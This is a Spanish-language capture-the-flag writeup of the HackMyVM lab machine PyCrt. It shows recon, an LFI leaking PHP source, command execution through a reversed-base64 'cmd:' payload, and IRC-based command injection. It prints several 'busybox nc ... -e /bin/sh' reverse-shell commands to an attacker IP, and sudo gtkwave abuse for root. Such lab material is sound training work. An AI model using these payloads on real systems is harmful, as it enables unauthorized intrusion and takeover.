<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="dark">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>PyCrt | Hack Stark ×͜×</title>
<meta name="keywords" content="LFI, RCE, IRC-Explotation, Sudo-Privilege, Xvfb, Gtkwave">
<meta name="description" content="Writeup de la máquina PyCrt en HackMyVM.">
<meta name="author" content="">
<link rel="canonical" href="https://hackstark.netlify.app/writeups/hackmyvm/pycrt/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://hackstark.netlify.app/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://hackstark.netlify.app/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://hackstark.netlify.app/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://hackstark.netlify.app/apple-touch-icon.png">
<link rel="mask-icon" href="https://hackstark.netlify.app/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://hackstark.netlify.app/writeups/hackmyvm/pycrt/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel='stylesheet' href='/css/custom.css'>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">

<script src="/js/main.js" defer></script>

<link rel="icon" type="image/png" href="/images/logo.png">
<link rel="apple-touch-icon" href="/images/logo.png">
<link rel="shortcut icon" href="/images/logo.png">
<meta name="theme-color" content="#2E3440">
<meta property="og:url" content="https://hackstark.netlify.app/writeups/hackmyvm/pycrt/">
  <meta property="og:site_name" content="Hack Stark ×͜×">
  <meta property="og:title" content="PyCrt">
  <meta property="og:description" content="Writeup de la máquina PyCrt en HackMyVM.">
  <meta property="og:locale" content="es">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2025-12-24T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-12-24T00:00:00+00:00">
    <meta property="article:tag" content="LFI">
    <meta property="article:tag" content="RCE">
    <meta property="article:tag" content="IRC-Explotation">
    <meta property="article:tag" content="Sudo-Privilege">
    <meta property="article:tag" content="Xvfb">
    <meta property="article:tag" content="Gtkwave">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="PyCrt">
<meta name="twitter:description" content="Writeup de la máquina PyCrt en HackMyVM.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Writeups",
      "item": "https://hackstark.netlify.app/writeups/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "",
      "item": "https://hackstark.netlify.app/writeups/hackmyvm/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "PyCrt",
      "item": "https://hackstark.netlify.app/writeups/hackmyvm/pycrt/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "PyCrt",
  "name": "PyCrt",
  "description": "Writeup de la máquina PyCrt en HackMyVM.",
  "keywords": [
    "LFI", "RCE", "IRC-Explotation", "Sudo-Privilege", "Xvfb", "Gtkwave"
  ],
  "articleBody": "Enumeración Iniciemos identificando la máquina víctima con ayuda de Arp-Scan :\narp-scan -I ens33 --localnet --ignoredups Como podemos observar, la IP de la máquina víctima es 192.168.1.66.\nVamos a realizar un escaneo para identificar primero los puertos abiertos con ayuda de Nmap:\nnmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.1.66 -oG allPorts Como podemos observar tenemos los puertos 22,80,6667, con esto en mente vamos a realizar un segundo escaneo para obtener información de estos puertos en específico:\nnmap -p22,80,6667 -sVC 192.168.1.66 -oN target Como podemos observar tenemos servicios ssh, http y irc corriendo, vamos a comenzar a enumerar el puerto 80 mirando su contenido:\nPodemos ver que tenemos en sí la página por defecto de apache2.\nVamos a revisar mediante la herramienta de irssi la conexión por el puerto 6667 a ver que logramos encontrar:\nirssi Vemos algo de información y algo que llama nuestra atención en el banner es que nombra al directorio ShadowSec por lo que vamos a intentar ver si esto existe en la web:\nVemos la web, pero en realidad a más de esa información no tenemos nada, podemos intentar hacer un poco de fuzzing con Gobuster y buscar por archivos con extensión .php:\ngobuster dir -u http://192.168.1.66/ShadowSec -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php Como podemos observar tenemos un archivo llamado bydataset.php, vemos que hace:\nno vemos nada interesante, pero vamos a intentar ver como se está tramitando la petición con BurpSuite:\nExplotación La verdad es que no vemos nada del otro mundo y no tenemos información, algo que podemos intentar talvez es buscar por parámetros en la url, vamos a intentarlo con ayuda de Wfuzz:\nwfuzz -c --hw=4 -t 200 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \"http://192.168.1.66/ShadowSec/bydataset.php?FUZZ\" podemos observar que es diferente al usar file, veamos en BurpSuite que es lo que sale:\nvemos que nos dice un error de lectura del archivo, esto me llama la atención y podemos intuir un Local File Inclusion (LFI), vemos si es posible:\nperfecto, esto funciona, podemos intentar leer logs y más, pero no tenemos permisos, por lo que vamos a intentar leer el mismo archivo bydataset.php a ver si es posible:\nExcelente, vamos a analizar el código a ver que podemos hacer:\nVemos que recibe también información por POST, con los parámetros auth y payload.\nVemos que auth=LetMeIn123! y que luego se llama a una función decrypt y enviamos el payload.\nHasta este punto vamos a intentar con la información que tenemos para ver que obtenemos:\nBueno, algo pasa con el payload, veamos que hace la función decrypt: Vemos que la función primero pone la cadena en reversa, luego hace decode de base64, entonces hasta allí yo lo que haría es mandar una cadena en base64 reversa, para lograr que al entrar en la función la ponga normal y luego haga el decode de base64, ahora el objetivo es entrar en el tercer apartado para que no retorne el false donde al parecer busca cmd: en la cadena para entrar, entonces vamos a hacer lo siguiente primero para probar:\necho \"cmd:whoami\" | base64 | rev ahora eso vamos a enviarlo en payload a ver que logramos:\nVemos que se ejecuta el whoami, ya tenemos una forma de ejecutar comandos.\nYa con esto vamos a intentar entablar una Reverse Shell de la siguiente manera:\necho \"cmd:busybox nc 192.168.1.68 443 -e /bin/sh\" | base64 | rev ya con esto generamos la Reverse shell:\nnc -nlvp 443 Listo ya tenemos la Reverse Shell, vamos a darle tratamiento y comenzamos a enumerar:\nEscalada de Privilegios Podemos observar como tenemos permiso para ejecutar como chatlake el binario de weechat, vamos a ver que podemos hacer ya dentro:\nsudo -u chatlake /usr/bin/weechat algo que tenemos que saber es que mediante una conexión nosotros podemos ejecutar comandos con /exec , quedando de la siguiente manera:\nperfecto, lo que voy a hacer es generar otra reverse shell para poder quedar como el usuario chatlake ejecutando /exec busybox nc 192.168.1.68 444 -e /bin/sh:\nListo, volvemos a intentar dar un tratamiento y luego comenzamos a enumerar.\nEn este usuario encontramos la flag de usuario.\nComo observamos podemos iniciar un servicio sin necesidad de introducir contraseña, podemos hacerlo para ver que logramos.\nListo ahora el revisar, enumerar y buscar donde o que podemos aprovechar en este servicio es una opción, pero la verdad no encontré nada, con eso en mente lo que hice es volver a conectarme al IRC, para ver si algo cambio:\na comparación de la primera vez ahora tenemos 6 canales disponibles, en este caso nos conectamos a todos y enviamos mensajes esperando respuestas o algo:\npodemos observar que llega un mensaje que nos dice que al final de los mensajes mandemos un :), vamos a intentarlo en los diferentes chats a ver que logramos:\nse genera una nueva conversación donde vemos lo siguiente:\nveamos con números:\nvemos lo mismo, podemos intentar enviar mensajes en los diferentes chats a ver si en alguno el mensaje cambia:\nVemos que en el canal 2 cambia el mensaje y vemos que dice que la ejecución del comando no se permitió.\nSi recordamos, teníamos una web con información donde tenemos operative: ll104567, podemos intentar cambiar el nick a ese valor para ver que logramos, para esto hacemos un /nick ll104567:\nperfecto ahora volvemos a intentar con el mensaje del numero a ver que sucede:\nvemos lo mismo, intentamos con las demás salas a ver si alguna cambia:\nPodemos observar que al enviarlo desde el chan1 logramos ver una A, esto es algo extraño, pero y si intentamos enviar letras en formato ascii:\nintentemos con la d en format decimal que sería el 100:\nEsto funciona, enviemos combinaciones simples como id a ver si se ejecuta 105 100:):\nvemos que sigue sin ser autorizado, pero vamos a intentar con diferentes comandos y para automatizar el proceso de pasar los valores a decimal se utilizara el siguiente script:\nimport sys def main(): command=sys.argv[1] command_decimal = '' for char in command: command_decimal += str(ord(char)) + \" \" print(f\"comand: {command_decimal}:)\") if __name__ == '__main__': main() listo con esto ya podemos volver a generar una Reverse Shell para estar como el usuario pycrtlake:\nListo, ahora le damos tratamiento y comenzamos a enumerar.\nVemos que podemos ejecutar gtkwave como root.\nNosotros mediante gtkwave podemos inicializar una consola interactiva TCL, el problema es que para esto necesitamos GUI pero al no tenerla esto fallara.\nVamos a emular un Display con ayuda de Xvfb de la siguiente manera:\nXvfb :1 \u0026 Ya con esto usaremos gtkwave donde con el parámetro -W e indicando el Display a usar que será el 1 vamos a ejecutarlo de la siguiente manera:\nsudo DISPLAY=:1 /usr/bin/gtkwave -W Tenemos la consola interactiva como root.\nYa podemos ver la flag:\nLab Terminado. ",
  "wordCount" : "1114",
  "inLanguage": "en",
  "datePublished": "2025-12-24T00:00:00Z",
  "dateModified": "2025-12-24T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://hackstark.netlify.app/writeups/hackmyvm/pycrt/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Hack Stark ×͜×",
    "logo": {
      "@type": "ImageObject",
      "url": "https://hackstark.netlify.app/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://hackstark.netlify.app/" accesskey="h" title="Hack Stark ×͜× (Alt + H)">Hack Stark ×͜×</a>
            <div class="logo-switches">
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://hackstark.netlify.app/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://hackstark.netlify.app/writeups/" title="WriteUps">
                    <span>WriteUps</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<div class="post-container">
  <article class="post-single">
    <header class="post-header">
      
      <h1 class="post-title entry-hint-parent">
        PyCrt
      </h1>
      <div class="post-description">
        Writeup de la máquina PyCrt en HackMyVM.
      </div>
      <div class="post-meta"><span title='2025-12-24 00:00:00 +0000 UTC'>December 24, 2025</span>&nbsp;·&nbsp;<span>6 min</span>

</div>

      <br />

      <h4>Tags:</h4>

      <br />
      <ul class="post-tags">
        <li><a href="https://hackstark.netlify.app/tags/lfi/">LFI</a></li>
        <li><a href="https://hackstark.netlify.app/tags/rce/">RCE</a></li>
        <li><a href="https://hackstark.netlify.app/tags/irc-explotation/">IRC-Explotation</a></li>
        <li><a href="https://hackstark.netlify.app/tags/sudo-privilege/">Sudo-Privilege</a></li>
        <li><a href="https://hackstark.netlify.app/tags/xvfb/">Xvfb</a></li>
        <li><a href="https://hackstark.netlify.app/tags/gtkwave/">Gtkwave</a></li>
      </ul>
    </header> 
    <div class="post-content"><h1 id="enumeración">Enumeración<a hidden class="anchor" aria-hidden="true" href="#enumeración">#</a></h1>
<p>Iniciemos identificando la máquina víctima con ayuda de <strong>Arp-Scan</strong> :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arp-scan -I ens33 --localnet --ignoredups
</span></span></code></pre></div><p><img alt="img1" loading="lazy" src="/img/Pasted%20image%2020251222162341.png"></p>
<p>Como podemos observar, la IP de la máquina víctima es <code>192.168.1.66</code>.</p>
<p>Vamos a realizar un escaneo para identificar primero los puertos abiertos con ayuda de <strong>Nmap</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -n -v -Pn 192.168.1.66 -oG allPorts
</span></span></code></pre></div><p><img alt="img2" loading="lazy" src="/img/Pasted%20image%2020251222162741.png"></p>
<p>Como podemos observar tenemos los puertos <code>22,80,6667</code>, con esto en mente vamos a realizar un segundo escaneo para obtener información de estos puertos en específico:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80,6667 -sVC 192.168.1.66 -oN target
</span></span></code></pre></div><p><img alt="img3" loading="lazy" src="/img/Pasted%20image%2020251222163230.png"></p>
<p>Como podemos observar tenemos servicios <code>ssh, http y irc</code> corriendo, vamos a comenzar a enumerar el puerto <code>80</code> mirando su contenido:</p>
<p><img alt="img4" loading="lazy" src="/img/Pasted%20image%2020251222163342.png"></p>
<p>Podemos ver que tenemos en sí la página por defecto de apache2.</p>
<p>Vamos a revisar mediante la herramienta de <code>irssi</code> la conexión por el puerto <code>6667</code> a ver que logramos encontrar:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>irssi
</span></span></code></pre></div><p><img alt="img5" loading="lazy" src="/img/Pasted%20image%2020251222163857.png"></p>
<p><img alt="img6" loading="lazy" src="/img/Pasted%20image%2020251222163930.png"></p>
<p>Vemos algo de información y algo que llama nuestra atención en el banner es que nombra al directorio <code>ShadowSec</code> por lo que vamos a intentar ver si esto existe en la web:</p>
<p><img alt="img7" loading="lazy" src="/img/%7B9C833D5B-66EE-44BC-B9A2-666F2C121EF7%7D.png"></p>
<p>Vemos la web, pero en realidad a más de esa información no tenemos nada, podemos intentar hacer un poco de fuzzing con <strong>Gobuster</strong> y buscar por archivos con extensión <code>.php</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://192.168.1.66/ShadowSec -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php
</span></span></code></pre></div><p><img alt="img8" loading="lazy" src="/img/%7BD4CADFA2-3363-41A5-B893-400B56FE06CE%7D.png"></p>
<p>Como podemos observar tenemos un archivo llamado <code>bydataset.php</code>, vemos que hace:</p>
<p><img alt="img9" loading="lazy" src="/img/%7B01DAF646-71A9-4973-BF54-DDA6E417240C%7D.png"></p>
<p>no vemos nada interesante, pero vamos a intentar ver como se está tramitando la petición con BurpSuite:</p>
<p><img alt="img10" loading="lazy" src="/img/%7B420DB422-5AAA-439A-A83E-4043A361DEB3%7D.png"></p>
<h1 id="explotación">Explotación<a hidden class="anchor" aria-hidden="true" href="#explotación">#</a></h1>
<p>La verdad es que no vemos nada del otro mundo y no tenemos información, algo que podemos intentar talvez es buscar por parámetros en la url, vamos a intentarlo con ayuda de <strong>Wfuzz</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c --hw<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt <span style="color:#e6db74">&#34;http://192.168.1.66/ShadowSec/bydataset.php?FUZZ&#34;</span>
</span></span></code></pre></div><p><img alt="img11" loading="lazy" src="/img/%7B591FF419-BD49-4C96-9742-1EF8A361A31F%7D.png"></p>
<p>podemos observar que es diferente al usar <code>file</code>, veamos en BurpSuite que es lo que sale:</p>
<p><img alt="img12" loading="lazy" src="/img/%7BC9F3C8C3-CFD9-4A39-89F4-DA32AEE2BEE2%7D.png"></p>
<p>vemos que nos dice un error de lectura del archivo, esto me llama la atención y podemos intuir un <strong>Local File Inclusion (LFI)</strong>, vemos si es posible:</p>
<p><img alt="img13" loading="lazy" src="/img/%7B4804A85C-7B97-44FE-84A4-0A3108ED6BFF%7D.png"></p>
<p>perfecto, esto funciona, podemos intentar leer logs y más, pero no tenemos permisos, por lo que vamos a intentar leer el mismo archivo <code>bydataset.php</code> a ver si es posible:</p>
<p><img alt="img14" loading="lazy" src="/img/%7BF7088DF2-D2B6-4FCF-8DCF-403A468CEFD9%7D.png"></p>
<p>Excelente, vamos a analizar el código a ver que podemos hacer:</p>
<p><img alt="img15" loading="lazy" src="/img/Pasted%20image%2020251224141012.png"></p>
<p>Vemos que recibe también información por <code>POST</code>, con los parámetros <code>auth y payload</code>.</p>
<p><img alt="img16" loading="lazy" src="/img/Pasted%20image%2020251224141140.png"></p>
<p>Vemos que <code>auth=LetMeIn123!</code> y que luego se llama a una función <code>decrypt</code> y enviamos el payload.</p>
<p>Hasta este punto vamos a intentar con la información que tenemos para ver que obtenemos:</p>
<p><img alt="img17" loading="lazy" src="/img/Pasted%20image%2020251224141408.png"></p>
<p>Bueno, algo pasa con el payload, veamos que hace la función <code>decrypt</code>:
<img alt="img18" loading="lazy" src="/img/Pasted%20image%2020251224141609.png"></p>
<p>Vemos que la función primero pone la cadena en reversa, luego hace decode de base64, entonces hasta allí yo lo que haría es mandar una cadena en base64 reversa, para lograr que al entrar en la función la ponga normal y luego haga el decode de base64, ahora el objetivo es entrar en el tercer apartado para que no retorne el <code>false</code> donde al parecer busca <code>cmd:</code> en la cadena para entrar, entonces vamos a hacer lo siguiente primero para probar:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;cmd:whoami&#34;</span> | base64 | rev
</span></span></code></pre></div><p><img alt="img19" loading="lazy" src="/img/%7B1CC78D2A-4F3B-4480-B8FF-FE821664C7AF%7D.png"></p>
<p>ahora eso vamos a enviarlo en payload a ver que logramos:</p>
<p><img alt="img20" loading="lazy" src="/img/%7BBD90F666-190D-45E1-A2D2-6185BBFDD41E%7D.png"></p>
<p>Vemos que se ejecuta el <code>whoami</code>, ya tenemos una forma de ejecutar comandos.</p>
<p>Ya con esto vamos a intentar entablar una Reverse Shell de la siguiente manera:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;cmd:busybox nc 192.168.1.68 443 -e /bin/sh&#34;</span> | base64 | rev
</span></span></code></pre></div><p><img alt="img21" loading="lazy" src="/img/%7B9BA47F30-19F9-4CFF-8966-1006CDAF04CE%7D.png"></p>
<p>ya con esto generamos la Reverse shell:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
</span></span></code></pre></div><p><img alt="img22" loading="lazy" src="/img/%7BC9AD1B5E-9635-43CC-BF2E-6F7C2927B840%7D.png"></p>
<p><img alt="img23" loading="lazy" src="/img/%7B75D45F67-3041-4A13-80E7-3451D4B4717A%7D.png"></p>
<p>Listo ya tenemos la Reverse Shell, vamos a darle tratamiento y comenzamos a enumerar:</p>
<p><img alt="img24" loading="lazy" src="/img/%7BDBBF60DD-735F-4DDF-A0F0-70E1DE190E79%7D.png"></p>
<h1 id="escalada-de-privilegios">Escalada de Privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
<p>Podemos observar como tenemos permiso para ejecutar como <code>chatlake</code> el binario de weechat, vamos a ver que podemos hacer ya dentro:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -u chatlake /usr/bin/weechat
</span></span></code></pre></div><p><img alt="img25" loading="lazy" src="/img/%7B82CD5AA1-00D0-4342-A698-6C0E03ED706C%7D.png"></p>
<p>algo que tenemos que saber es que mediante una conexión nosotros podemos ejecutar comandos con <code>/exec &lt;comando&gt;</code>, quedando de la siguiente manera:</p>
<p><img alt="img26" loading="lazy" src="/img/%7B97FCB00B-3A13-498C-B9A0-3F2C5C413FCC%7D.png"></p>
<p>perfecto, lo que voy a hacer es generar otra reverse shell para poder quedar como el usuario <code>chatlake</code> ejecutando <code>/exec busybox nc 192.168.1.68 444 -e /bin/sh</code>:</p>
<p><img alt="img27" loading="lazy" src="/img/%7BEC6B7538-A9DA-4B19-855D-26B5B77A7859%7D.png"></p>
<p>Listo, volvemos a intentar dar un tratamiento y luego comenzamos a enumerar.</p>
<p>En este usuario encontramos la flag de usuario.</p>
<p><img alt="img28" loading="lazy" src="/img/%7BF49A9027-36FC-4FBB-BBC0-97900A09C0F7%7D.png"></p>
<p><img alt="img29" loading="lazy" src="/img/%7B4F0ACD83-8644-40D0-804C-2ECC6DCEB493%7D.png"></p>
<p>Como observamos podemos iniciar un servicio sin necesidad de introducir contraseña, podemos hacerlo para ver que logramos.</p>
<p><img alt="img30" loading="lazy" src="/img/%7BF4F49883-1FE5-4502-B04E-7F395229CE80%7D.png"></p>
<p>Listo ahora el revisar, enumerar y buscar donde o que podemos aprovechar en este servicio es una opción, pero la verdad no encontré nada, con eso en mente lo que hice es volver a conectarme al IRC, para ver si algo cambio:</p>
<p><img alt="img31" loading="lazy" src="/img/Pasted%20image%2020251224152932.png"></p>
<p>a comparación de la primera vez ahora tenemos 6 canales disponibles, en este caso nos conectamos a todos y enviamos mensajes esperando respuestas o algo:</p>
<p><img alt="img32" loading="lazy" src="/img/%7B0B86E75F-E9F1-45F5-83C5-E00B41808593%7D.png"></p>
<p>podemos observar que llega un mensaje que nos dice que al final de los mensajes mandemos un <code>:)</code>, vamos a intentarlo en los diferentes chats a ver que logramos:</p>
<p><img alt="img33" loading="lazy" src="/img/%7B4AA6F875-6662-4BEE-92FC-F08AE36AB984%7D.png"></p>
<p>se genera una nueva conversación donde vemos lo siguiente:</p>
<p><img alt="img34" loading="lazy" src="/img/%7B0B935E4D-2A6A-4981-8EDD-EA9F2F8E5030%7D.png"></p>
<p>veamos con números:</p>
<p><img alt="img35" loading="lazy" src="/img/%7B126D3E36-F34A-47E6-97C9-BEAFAF1C2463%7D.png"></p>
<p><img alt="img36" loading="lazy" src="/img/%7B085EF87B-1B5E-44FA-806A-DD161B416D36%7D.png"></p>
<p>vemos lo mismo, podemos intentar enviar mensajes en los diferentes chats a ver si en alguno el mensaje cambia:</p>
<p><img alt="img37" loading="lazy" src="/img/%7BEE5439EE-9756-4542-B367-45220FA94212%7D.png"></p>
<p><img alt="img38" loading="lazy" src="/img/%7B2A1DF68D-FEDC-4B85-8908-9EF3A3AC29C1%7D.png"></p>
<p>Vemos que en el canal 2 cambia el mensaje y vemos que dice que la ejecución del comando no se permitió.</p>
<p>Si recordamos, teníamos una web con información donde tenemos <code>operative: ll104567</code>, podemos intentar cambiar el nick a ese valor para ver que logramos, para esto hacemos un <code>/nick ll104567</code>:</p>
<p><img alt="img39" loading="lazy" src="/img/%7BE9850FA2-019E-4F49-8F52-59D6DDE1A1E4%7D.png"></p>
<p>perfecto ahora volvemos a intentar con el mensaje del numero a ver que sucede:</p>
<p><img alt="img40" loading="lazy" src="/img/%7B3A352884-B90C-4369-A2B6-35280D4D3F7E%7D.png"></p>
<p>vemos lo mismo, intentamos con las demás salas a ver si alguna cambia:</p>
<p><img alt="img41" loading="lazy" src="/img/%7B2B3268E6-B960-4D1A-8454-2DC62F582F0A%7D.png"></p>
<p>Podemos observar que al enviarlo desde el <code>chan1</code> logramos ver una <code>A</code>, esto es algo extraño, pero y si intentamos enviar letras en formato ascii:</p>
<p><img alt="img42" loading="lazy" src="/img/%7B899A6D1E-E334-4B79-A6E1-645F8B20AE75%7D.png"></p>
<p>intentemos con la <code>d</code> en format decimal que sería el <code>100</code>:</p>
<p><img alt="img43" loading="lazy" src="/img/%7B3DBB7B58-560C-4DB7-BF68-67872EB7A3D0%7D.png"></p>
<p>Esto funciona, enviemos combinaciones simples como <code>id</code> a ver si se ejecuta <code>105 100:)</code>:</p>
<p><img alt="img44" loading="lazy" src="/img/%7B2224E7BF-A896-47B5-B376-7D27E9524B44%7D.png"></p>
<p>vemos que sigue sin ser autorizado, pero vamos a intentar con diferentes comandos y para automatizar el proceso de pasar los valores a decimal se utilizara el siguiente script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    command<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    command_decimal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> command:
</span></span><span style="display:flex;"><span>        command_decimal <span style="color:#f92672">+=</span> str(ord(char)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;comand: </span><span style="color:#e6db74">{</span>command_decimal<span style="color:#e6db74">}</span><span style="color:#e6db74">:)&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p><img alt="img45" loading="lazy" src="/img/%7B49D08AA1-5843-4687-B6CB-8409959E285B%7D.png"></p>
<p><img alt="img46" loading="lazy" src="/img/%7BA64FE51B-1877-463E-ADA4-A464B96D7DF9%7D.png"></p>
<p>listo con esto ya podemos volver a generar una Reverse Shell para estar como el usuario <code>pycrtlake</code>:</p>
<p><img alt="img47" loading="lazy" src="/img/%7B5711073E-EE85-443E-B791-94B4AE8B495C%7D.png">
<img alt="img48" loading="lazy" src="/img/%7B630FC8BE-DC2C-429B-894D-B254A3256EDD%7D.png"></p>
<p>Listo, ahora le damos tratamiento y comenzamos a enumerar.</p>
<p><img alt="img49" loading="lazy" src="/img/%7BABB7C062-0275-429B-B024-48CE392049F5%7D.png"></p>
<p>Vemos que podemos ejecutar <code>gtkwave</code> como root.</p>
<p>Nosotros mediante <code>gtkwave</code> podemos inicializar una consola interactiva TCL, el problema es que para esto necesitamos GUI pero al no tenerla esto fallara.</p>
<p>Vamos a emular un <code>Display</code> con ayuda de <code>Xvfb</code> de la siguiente manera:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Xvfb :1 &amp;
</span></span></code></pre></div><p><img alt="img50" loading="lazy" src="/img/%7B29C7FF23-FB5C-4C84-99A2-E022C4898A18%7D.png"></p>
<p>Ya con esto usaremos <code>gtkwave</code> donde con el parámetro <code>-W</code> e indicando el <code>Display</code> a usar que será el <code>1</code> vamos a ejecutarlo de la siguiente manera:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo DISPLAY<span style="color:#f92672">=</span>:1 /usr/bin/gtkwave -W
</span></span></code></pre></div><p><img alt="img51" loading="lazy" src="/img/%7B5DA118C3-9DD7-4E7A-AC1F-D330570A8C9C%7D.png"></p>
<p>Tenemos la consola interactiva como <code>root</code>.</p>
<p>Ya podemos ver la flag:</p>
<p><img alt="img52" loading="lazy" src="/img/%7B2B5443FC-8992-449F-9C3D-37776B6954B9%7D.png"></p>
<p>Lab Terminado.
<img alt="img53" loading="lazy" src="/img/%7BA7276E19-2262-43C5-B31A-010F15E53D18%7D.png"></p>


    </div>

    <footer class="post-footer">
    </footer>
  </article>

  
  <aside id="sidebar-toc">
    <div class="sidebar-title">Contenido</div>
    <ul id="toc-list"></ul>
  </aside>
</div>

<style>
   
  .post-container {
    display: flex;
    flex-direction: row;
    justify-content: flex-start;
    position: relative;
  }

   
  .post-single {
    display: flex;
    flex-direction: column;
    justify-content: center;
    max-width: 850px;
    padding: 1rem 1rem;
  }

   
  #sidebar-toc {
    position: fixed;
    top: 11%;
    right: 20%;
    width: 260px;
    background-color: rgba(25, 25, 25, 0.95);
    border-radius: 12px;
    padding: 15px 20px;
    color: #fff;
    font-size: 14px;
    max-height: 80vh;
    overflow-y: auto;
    box-shadow: 0 0 15px rgba(0, 0, 0, 0.4);
    z-index: 1000;
    transition: all 0.3s ease;
  }

   
  .sidebar-title {
    font-weight: bold;
    color: #00bfff;
    margin-bottom: 10px;
